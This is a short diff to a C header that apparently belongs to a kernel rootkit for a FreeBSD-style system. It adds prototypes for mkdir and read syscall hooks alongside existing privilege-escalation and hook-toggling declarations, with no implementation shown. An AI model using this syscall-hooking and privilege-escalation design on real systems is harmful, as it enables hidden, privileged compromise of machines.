@@ -34,7 +34,8 @@
 
 void escalate_privledge(struct thread * td);
 void toggle_hook(char * state, int sys_call_num, void*dest_func);
-
+int mkdir_hook(struct thread *td, void *syscall_args);
+int read_hook(struct thread *td, void * syscall_args);
 #ifndef CONFIG_H
 #define CONFIG_H
 
